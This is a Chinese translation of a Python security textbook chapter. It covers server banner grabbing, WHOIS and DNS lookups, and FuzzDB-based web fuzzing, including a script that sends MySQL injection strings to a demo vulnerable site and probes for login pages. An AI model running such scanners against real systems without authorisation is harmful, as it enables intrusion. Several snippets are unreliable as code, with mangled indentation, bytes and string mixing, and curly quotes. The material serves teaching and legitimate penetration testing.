横幅显示与 Web 服务器的名称和正在运行的版本相关的信息。有些暴露了使用的后端技术（PHP、Java、Python）及其版本。生产版本可能存在公共或非公共的故障，因此测试公开暴露的服务器返回的横幅是否暴露了我们不希望公开的某些信息，这总是一个很好的做法。

使用标准的 Python 库，可以创建一个简单的程序，连接到服务器并捕获响应中包含的服务的横幅。获取服务器横幅的最简单方法是使用`socket`模块。我们可以通过`recvfrom()`方法发送一个 get 请求并获取响应，该方法将返回一个带有结果的元组。

您可以在`BannerServer.py`文件中找到以下代码：

```py
import socket
import argparse
import re
parser = argparse.ArgumentParser(description='Get banner server')
# Main arguments
parser.add_argument("-target", dest="target", help="target IP", required=True)
parser.add_argument("-port", dest="port", help="port", type=int, required=True)
parsed_args = parser.parse_args()
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((parsed_args.target, parsed_args.port))
sock.settimeout(2)
http_get = b"GET / HTTP/1.1\nHost: "+parsed_args.target+"\n\n"
data = ''
try:
    sock.sendall(http_get)
    data = sock.recvfrom(1024)
    data = data[0]
    print data
    headers = data.splitlines()
    #  use regular expressions to look for server header
    for header in headers:
        if re.search('Server:', header):
            print(header)
except socket.error:
    print ("Socket error", socket.errno)
finally:
    sock.close()
```

上述脚本接受**目标**和**端口**作为**参数**：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/b52f0624-d259-4b14-9aa8-08109c1110ea.png)

在这种情况下，我们获得了端口 80 上的 Web 服务器版本：

`**python .\BannerServer.py -target www.google.com -port 80**`

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/9a3bcd8a-75d9-4f68-82eb-90a05b492014.png)

# 查找有关服务器的 whois 信息

我们可以使用 WHOIS 协议来查看域名的注册所有者。有一个名为 python-whois 的 Python 模块，用于此协议，文档位于[`pypi.python.org/pypi/python-whois`](https://pypi.python.org/pypi/python-whois)，可以使用`pip install python-whois`命令安装。

例如，如果我们想查询某个域的服务器名称和所有者，我们可以通过`get_whois()`方法来查询。该方法返回一个字典结构（`键->值`）。

```py
>>> import pythonwhois
>>> whois = pythonwhois.get_whois(domain)
>>> for key in whois.keys():
>>  print "%s : %s \n" %(key, whois[key])
```

使用`pythonwhois.net.get_root_server()`方法，可以恢复给定域的根服务器：

```py
>>> whois = pythonwhois.net.get_root_server(domain)
```

使用`pythonwhois.net.get_whois_raw()`方法，可以检索给定域的所有信息：

```py
>>> whois = pythonwhois.net.get_whois_raw(domain)
```

在下面的脚本中，我们看到一个完整的示例，我们从中提取信息的域作为参数传递。

您可以在`PythonWhoisExample.py`文件中找到以下代码：

```py
if len(sys.argv) != 2:
    print “[-] usage python PythonWhoisExample.py <domain_name>”
    sys.exit()
print sys.argv[1]
whois = pythonwhois.get_whois(sys.argv[1])
for key in whois.keys():
    print “[+] %s : %s \n” %(key, whois[key])
whois = pythonwhois.net.get_root_server(sys.argv[1])
print whois
whois = pythonwhois.net.get_whois_raw(sys.argv[1])
print whois
```

# 使用 DNSPython 获取 DNS 服务器信息

在本节中，我们将在 Python 中创建一个 DNS 客户端，并查看此客户端将如何获取有关名称服务器、邮件服务器和 IPV4/IPV6 地址的信息。

# DNS 协议

DNS 代表域名服务器，域名服务用于将 IP 地址与域名链接起来。 DNS 是一个全球分布的映射主机名和 IP 地址的数据库。 它是一个开放和分层的系统，许多组织选择运行自己的 DNS 服务器。

DNS 协议用于不同的目的。 最常见的是：

+   名称解析：给定主机的完整名称，可以获取其 IP 地址。

+   反向地址解析：这是与上一个相反的机制。 它可以根据 IP 地址获取与之关联的名称。

+   邮件服务器解析：给定邮件服务器域名（例如 gmail.com），可以通过它来进行通信的服务器（例如 gmail-smtp-in.l.google.com）。

DNS 还是设备用于查询 DNS 服务器以将主机名解析为 IP 地址（反之亦然）的协议。 `nslookup`工具附带大多数 Linux 和 Windows 系统，并且它允许我们在命令行上查询 DNS。 在这里，我们确定 python.org 主机具有 IPv4 地址`23.253.135.79`：

`$ nslookup python.org`

这是 python.org 域的地址解析：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/bc740de9-7a55-40d3-accb-1884f928fb65.png)

# DNS 服务器

人类更擅长记住与对象相关的名称，而不是长序列的数字。 记住 google.com 域名比 IP 地址要容易得多。 此外，IP 地址可能会因网络基础设施的变动而发生变化，而域名保持不变。

它的操作基于使用分布式和分层数据库，其中存储了域名和 IP 地址，以及提供邮件服务器位置服务的能力。

DNS 服务器位于应用层，通常使用端口 53（UDP）。 当客户端发送 DNS 数据包以执行某种类型的查询时，必须发送要查询的记录类型。 一些最常用的记录是：

+   A：允许您查询 IPv4 地址

+   AAAA：允许您查询 IPv6 地址

+   MX：允许您查询邮件服务器

+   NS：允许您查询服务器的名称（名称服务器）

+   TXT：允许您以文本格式查询信息

# DNSPython 模块

DnsPython 是一个用 Python 编写的开源库，允许对 DNS 服务器进行查询记录操作。 它允许访问高级和低级。 在高级别允许查询 DNS 记录，而在低级别允许直接操作区域，名称和寄存器。

PyPI 提供了一些 DNS 客户端库。 我们将重点关注`dnspython`库，该库可在[`www.dnspython.org`](http://www.dnspython.org)上找到。

安装可以通过 python 存储库或通过下载 github 源代码（[`github.com/rthalley/dnspython`](https://github.com/rthalley/dnspython)）并运行`setup.py`安装文件来完成。

您可以使用`easy_install`命令或`pip`命令安装此库：

```py
$ pip install dnspython
```

此模块的主要包括：

```py
import dns
import dns.resolver
```

我们可以从特定域名获取的信息是：

+   邮件服务器记录：ansMX = dns.resolver.query（'domain'，'MX'）

+   名称服务器记录：ansNS = dns.resolver.query（'domain'，'NS'）

+   IPV4 地址记录：ansipv4 = dns.resolver.query（'domain'，'A'）

+   IPV6 地址记录：ansipv6 = dns.resolver.query（'domain'，'AAAA'）

在此示例中，我们正在对具有`dns.resolver`子模块的主机的 IP 地址进行简单查询：

```py
import dns.resolver
answers = dns.resolver.query('python.org', 'A')
for rdata in answers:
    print('IP', rdata.to_text())
```

我们可以使用`is_subdomain（）`方法检查一个域是否是另一个域的**子域**：

```py
domain1= dns.name.from_text('domain1')
domain2= dns.name.from_text('domain2')
domain1.is_subdomain(domain2)
```

从 IP 地址获取域名：

```py
import dns.reversename
domain = dns.reversename.from_address("ip_address")
```

从域名获取 IP：

```py
import dns.reversename
ip = dns.reversename.to_address("domain")
```

如果要进行**反向查找**，需要使用`dns.reversename`子模块，如下例所示：

您可以在`DNSPython-reverse-lookup.py`文件中找到以下代码：

```py
import dns.reversename

name = dns.reversename.from_address("ip_address")
print name
print dns.reversename.to_address(name)
```

在这个完整的示例中，我们将域作为参数传递，从中提取信息。

您可以在`DNSPythonServer_info.py`文件中找到以下代码：

```py
import dns
import dns.resolver
import dns.query
import dns.zone
import dns.name
import dns.reversename
import sys

if len(sys.argv) != 2:
    print "[-] usage python DNSPythonExample.py <domain_name>"
    sys.exit()

domain = sys.argv[1]
ansIPV4,ansMX,ansNS,ansIPV6=(dns.resolver.query(domain,'A'), dns.resolver.query(domain,'MX'),
dns.resolver.query(domain, 'NS'),
dns.resolver.query(domain, 'AAAA'))

print('Name Servers: %s' % ansNS.response.to_text())
print('Name Servers: %s' %[x.to_text() for x in ansNS])
print('Ipv4 addresses: %s' %[x.to_text() for x in ansIPV4])
print('Ipv4 addresses: %s' % ansIPV4.response.to_text())
print('Ipv6 addresses: %s' %[x.to_text() for x in ansIPV6])
print('Ipv6 addresses: %s' % ansIPV6.response.to_text())
print('Mail Servers: %s' % ansMX.response.to_text())
for data in ansMX:
    print('Mailserver', data.exchange.to_text(), 'has preference', data.preference)
```

例如，如果我们尝试从 python.org 域获取信息，我们会得到以下结果。

使用上一个脚本，我们可以从 python.org 域中获取 NameServers：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/1924876b-2efb-4126-a3e6-06b75175d6e1.png)

在这个截图中，我们可以看到从 python.org 解析出的**IPV4 和 IPV6 地址**：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/948e0d86-308e-4b28-a7e9-581c5a719d3b.png)

在这个截图中，我们可以看到从`python.org`解析出的**邮件服务器**：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/546541b0-aea9-4f57-a64d-21422822a1f7.png)

# 使用模糊测试获取服务器中的易受攻击的地址

在本节中，我们将学习有关模糊测试过程以及如何使用此实践与 Python 项目来获取容易受到攻击者攻击的 URL 和地址。

# 模糊测试过程

模糊器是一个程序，其中包含可以针对特定应用程序或服务器可预测的 URL 的文件。基本上，我们对每个可预测的 URL 进行请求，如果我们看到响应正常，这意味着我们找到了一个不公开或隐藏的 URL，但后来我们发现我们可以访问它。

像大多数可利用的条件一样，模糊测试过程只对不正确地对输入进行消毒或接受超出其处理能力的数据的系统有用。

总的来说，模糊测试过程包括以下**阶段**：

+   **识别目标**：要对应用程序进行模糊测试，我们必须确定目标应用程序。

+   **识别输入**：漏洞存在是因为目标应用程序接受了格式不正确的输入并在未经消毒的情况下处理它。

+   **创建模糊数据**：在获取所有输入参数后，我们必须创建无效的输入数据发送到目标应用程序。

+   **模糊测试**：创建模糊数据后，我们必须将其发送到目标应用程序。我们可以使用模糊数据来监视调用服务时的异常。

+   **确定可利用性**：模糊测试后，我们必须检查导致崩溃的输入。

# FuzzDB 项目

FuzzDB 是一个项目，其中我们可以找到一组包含已在多次渗透测试中收集的已知攻击模式的文件夹，主要是在 Web 环境中：[`github.com/fuzzdb-project/fuzzdb`](https://github.com/fuzzdb-project/fuzzdb)。

FuzzDB 类别分为不同的目录，这些目录包含可预测的资源位置模式、用于检测带有恶意有效负载或易受攻击的路由的模式：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/f74dd986-38d2-4cda-9888-b16e47fa734f.png)

# 使用 pywebfuzz 进行模糊测试

pywebfuzz 是一个 Python 模块，通过暴力方法帮助识别 Web 应用程序中的漏洞，并提供测试服务器和 Web 应用程序（如 apache 服务器、jboss 和数据库）漏洞的资源。

该项目的目标之一是简化对 Web 应用程序的测试。pywebfuzz 项目提供了用于测试用户、密码和代码与 Web 应用程序的值和逻辑。

在 Python 中，我们找到`pywebfuzz`模块，其中有一组类，允许访问 FuzzDB 目录并使用它们的有效负载。PyWebFuzz 中创建的类结构是按不同的攻击方案组织的；这些方案代表 FuzzDB 中可用的不同有效负载。

它有一个类结构，负责读取 FuzzDB 中可用的文件，以便稍后我们可以在 Python 中使用它们在我们的脚本中。

首先，我们需要导入`fuzzdb`模块：

```py
from pywebfuzz import fuzzdb
```

例如，如果我们想在服务器上搜索登录页面，我们可以使用`fuzzdb.Discovery.PredictableRes.Logins`模块：

```py
logins = fuzzdb.Discovery.PredictableRes.Logins
```

这将返回一个可预测资源的列表，其中每个元素对应于 Web 服务器中存在的 URL，可能是易受攻击的：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/67c1c29f-5f68-4ad9-852d-a763e089e12c.png)

我们可以在 Python 中编写一个脚本，在分析的 URL 给定的情况下，我们可以测试连接到每个登录路由，如果请求返回代码`200`，则页面已在服务器中找到。

在此脚本中，我们可以获取可预测的 URL，例如登录、管理员、管理员和默认页面，对于每个组合域+可预测的 URL，我们验证返回的状态代码。

您可以在`pywebfuzz_folder`内的`demofuzzdb.py`文件中找到以下代码：

```py
from pywebfuzz import fuzzdb
import requests

logins = fuzzdb.Discovery.PredictableRes.Logins
domain = "http://testphp.vulnweb.com"
  for login in logins:
 print("Testing... "+ domain + login)
 response = requests.get(domain + login)
 if response.status_code == 200:
 print("Login Resource detected: " +login)
```

您还可以获取服务器支持的 HTTP 方法：

```py
httpMethods= fuzzdb.attack_payloads.http_protocol.http_protocol_methods
```

从 python 解释器的先前命令的输出显示了可用的 HTTP 方法：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/8674b58d-92e1-4f44-b6a2-27eaae40d3fa.png)

您可以在`pywebfuzz_folder`内的`demofuzzdb2.py`文件中找到以下代码：

```py
from pywebfuzz import fuzzdb
import requests
httpMethods= fuzzdb.attack_payloads.http_protocol.http_protocol_methods
domain = "http://www.google.com" for method in httpMethods:
    print("Testing... "+ domain +"/"+ method)
    response = requests.get(domain, method)
    if response.status_code not in range(400,599):
        print(" Method Allowed: " + method)
```

有一个模块允许您在 Apache tomcat 服务器上搜索可预测的资源：

```py
tomcat = fuzzdb.Discovery. PredictableRes.ApacheTomcat
```

此子模块允许您获取字符串以检测 SQL 注入漏洞：

```py
fuzzdb.attack_payloads.sql_injection.detect.GenericBlind
```

在这个屏幕截图中，我们可以看到`fuzzdb sql_injection`模块的执行：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/97ebbc4b-840a-4b52-84a1-eda6490ebeba.png)

在这种情况下返回的信息与项目的 GitHub 存储库中找到的信息相匹配。[`github.com/fuzzdb-project/fuzzdb/tree/master/attack/sql-injection/detect`](https://github.com/fuzzdb-project/fuzzdb/tree/master/attack/sql-injection/detect)包含许多用于检测 SQL 注入情况的文件，例如，我们可以找到**GenericBlind.txt**文件，其中包含与 Python 模块返回的相同字符串。

在 GitHub 存储库中，我们看到一些文件取决于我们正在测试的 SQL 攻击和数据库类型：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/1107a246-1469-4197-8a84-cdf0fe899375.png)

我们还可以找到其他用于测试 MySQL 数据库中 SQL 注入的文件：[`github.com/fuzzdb-project/fuzzdb/blob/master/attack/sql-injection/detect/MySQL.txt`](https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/sql-injection/detect/MySQL.txt)。

在`Mysql.txt`文件中，我们可以看到所有可用的攻击向量，以发现 SQL 注入漏洞：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/f3866661-f9d6-4654-b485-30ff8e20c8af.png)

我们可以使用先前的文件来检测特定站点中的 SQL 注入漏洞：testphp.vulnweb.com。

您可以在`pywebfuzz_folder`内的`demofuzz_sql.py`文件中找到以下代码：

```py
from pywebfuzz import fuzzdb
import requests

mysql_attacks= fuzzdb.attack_payloads.sql_injection.detect.MySQL

domain = "http://testphp.vulnweb.com/listproducts.php?cat="

for attack in mysql_attacks:
    print "Testing... "+ domain + attack
    response = requests.get(domain + attack)
    if "mysql" in response.text.lower(): 
        print("Injectable MySQL detected")
        print("Attack string: "+attack)
```

先前脚本的执行显示了输出：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/5035d6a0-6ff4-41a0-ad90-2cc3ada3e8bf.png)

以下示例将创建一个包含来自 fuzzdb 的所有值的 Python 列表，用于 LDAP 注入：

```py
from pywebfuzz import fuzzdb ldap_values=fuzzdb.attack_payloads.ldap.ldap_injection
```

现在`ldap_values`变量将是一个包含来自 fuzzdb 的`ldap_injection`文件的 Python 字典。然后，您可以使用您的测试迭代此变量的顶部。

我们可以在 fuzzbd 项目中找到 ldap 文件夹：[`github.com/fuzzdb-project/fuzzdb/tree/master/attack/ldap`](https://github.com/fuzzdb-project/fuzzdb/tree/master/attack/ldap)。

# 总结

本章的目标之一是了解允许我们提取服务器以公开方式暴露的信息的模块。使用我们讨论过的工具，我们可以获得足够的信息，这些信息可能对我们的后续渗透测试或审计过程有用。

在下一个章节中，我们将探讨与 FTP、SSH 和 SNMP 服务器交互的 python 编程包。

# 问题

1.  我们需要什么来访问 Shodan 开发者 API？

1.  应该在 shodan API 中调用哪个方法以获取有关给定主机的信息，该方法返回什么数据结构？

1.  哪个模块可以用来获取服务器的横幅？

1.  应该调用哪个方法并传递什么参数来获取`DNSPython`模块中的 IPv6 地址记录？

1.  应该调用哪个方法并传递什么参数以获取`DNSPython`模块中邮件服务器的记录？

1.  使用`DNSPython`模块应调用哪个方法以及应传递哪些参数以获取名称服务器的记录？

1.  哪个项目包含文件和文件夹，其中包含在各种网页应用程序的渗透测试中收集的已知攻击模式？

1.  应使用哪个模块来查找可能易受攻击的服务器上的登录页面？

1.  `FuzzDB`项目模块允许我们获取字符串以检测 SQL 注入类型的漏洞是哪个？

1.  DNS 服务器用于解析邮件服务器名称的请求的端口是多少？

# 进一步阅读

在这些链接中，您将找到有关上述工具的更多信息以及一些被评论模块的官方 Python 文档：

[`developer.shodan.io/api`](https://developer.shodan.io/api)

[`www.dnspython.org`](http://www.dnspython.org)

您可以使用 python `dnslib`模块创建自己的 DNS 服务器：[`pypi.org/project/dnslib/`](https://pypi.org/project/dnslib/)

[`github.com/fuzzdb-project/fuzzdb`](https://github.com/fuzzdb-project/fuzzdb).

在 Python 生态系统中，我们可以找到其他模糊器，例如**wfuzz**。

Wfuzz 是一个 Web 应用程序安全模糊测试工具，您可以从命令行或使用 Python 库进行编程：[`github.com/xmendez/wfuzz`](https://github.com/xmendez/wfuzz)。

官方文档可在[`wfuzz.readthedocs.io`](http://wfuzz.readthedocs.io/)找到。

使用`python Shodan`模块的项目示例：

+   [`www.programcreek.com/python/example/107467/shodan.Shodan`](https://www.programcreek.com/python/example/107467/shodan.Shodan)

+   [`github.com/NullArray/Shogun`](https://github.com/NullArray/Shogun)

+   [`github.com/RussianOtter/networking/blob/master/8oScanner.py`](https://github.com/RussianOtter/networking/blob/master/8oScanner.py)

+   [`github.com/Va5c0/Shodan_cmd`](https://github.com/Va5c0/Shodan_cmd)

+   [`github.com/sjorsng/osint-combinerhttps://github.com/carnal0wnage/pentesty_scripts`](https://github.com/sjorsng/osint-combinerhttps://github.com/carnal0wnage/pentesty_scripts)

+   [`github.com/ffmancera/pentesting-multitool`](https://github.com/ffmancera/pentesting-multitool)

+   [`github.com/ninj4c0d3r/ShodanCli`](https://github.com/ninj4c0d3r/ShodanCli)

如果我们有兴趣在没有暴力破解过程的情况下查找网页目录，我们可以使用名为`dirhunt`的工具，基本上是一个用于搜索和分析网站中目录的网络爬虫。

[`github.com/Nekmo/dirhunt`](https://github.com/Nekmo/dirhunt)

您可以使用命令`**pip install dirhunt**`来安装它

这个工具支持 Python 2.7 版本和 3.x 版本，但建议使用 Python 3.x
